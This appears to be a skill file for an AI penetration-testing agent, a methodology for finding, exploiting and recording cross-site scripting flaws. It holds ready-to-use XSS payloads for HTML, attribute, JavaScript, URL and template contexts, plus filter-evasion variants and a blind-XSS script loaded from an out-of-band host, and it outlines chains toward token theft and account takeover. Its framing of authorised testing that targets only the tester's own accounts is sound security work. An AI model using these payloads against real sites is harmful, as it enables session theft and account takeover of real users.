---
name: xss
title: Cross-site scripting — reflected, stored, DOM
triggers: Load when user input is rendered back in a page or a JS-driven view — search terms, profile fields, comments, filenames, error messages, URL fragments read by client code, or any value that comes back inside HTML, attributes, JS strings or URLs.
attack: initial-access, execution
owasp: A05
payloads: XSS Injection; CSS Injection; DOM Clobbering; Prototype Pollution
---

XSS is a context problem. Find where input lands, identify the exact context, then use a payload built for that context — and prove *execution*, not reflection.

## 1. Find the sinks
- Inject a unique, inert canary (`pwn7x3q`) into every parameter, header that's echoed, JSON field, filename and profile field; search responses (and later pages, emails, admin views) for it.
- Stored: anything persisted and shown to another role — comments, names, tickets, file metadata. Note who views it (an admin viewer turns a low into a high).
- DOM: read the JS for sources (`location.hash/search`, `postMessage`, `document.referrer`, `localStorage`) flowing into sinks (`innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `$.html()`, `v-html`, `dangerouslySetInnerHTML`, `href`/`src` assignment).

## 2. Identify the context, then break out
- HTML body: `<img src=x onerror=alert(document.domain)>`, `<svg onload=…>`.
- Attribute: close the quote — `" autofocus onfocus=alert(document.domain) x="`; unquoted → space-separated handler.
- JS string: `';alert(document.domain);//` or `</script><svg onload=…>`; template literals `${alert(document.domain)}`.
- URL context (`href`, `src`, redirects): `javascript:alert(document.domain)`.
- Framework templates (Angular/Vue client-side): `{{constructor.constructor('alert(document.domain)')()}}` — and see `server-injection` if it evaluates server-side.
Probe which characters survive (`<>"'`/`) before guessing payloads; encoding tells you the context and the filter.

## 3. Filters, WAF, CSP
- Vary form, not intent: case, alternative tags/events (`<details open ontoggle>`), entity/URL encoding, double encoding where something decodes twice.
- Read the CSP: `unsafe-inline`, wildcard/JSONP-capable allowed hosts, missing `base-uri`/`object-src`, nonce reuse. A strong CSP can reduce a finding's severity — record that honestly.

## 4. Confirm, prove, chain
- **Confirm:** execution in a real browser, not a reflected string. Use the `screenshot` tool on the payload URL (as the victim's `browser_session`, `highlight` the DOM marker the payload created, e.g. `document.domain` written into the page). Control: the same request with the canary only.
- **Impact:** demonstrate what the script can do *in this app*: read a CSRF token or an API response the victim can see, call an authenticated endpoint, read a non-HttpOnly session cookie. Use your own test accounts as the victim; never target real users.
- **Blind XSS** (stored input rendered in a back office you can't see — support tickets, moderation queues, logs): load a script from an `oast` payload (`<script src=//<payload>/x.js>`); an HTTP hit with an admin-panel Referer and the reviewer's User-Agent is the proof. Poll for a while — reviews can be hours late.
- **Chain:** stored XSS viewed by an admin → admin actions; token theft → account takeover; combine with `browser-trust` (CSRF/CORS) for cross-origin effects.

## Record & validate
- `state_update action=vuln owasp=[A05]` with the context, the exact payload, where it executes and who views it; evidence = screenshot + the request.
- Reflection without execution stays `depth=detected`. Self-XSS with no delivery path → low, `stop_reason` explaining why.
- Inputs tested clean → `action=endpoint owasp=[A05]` so injection coverage is visible.
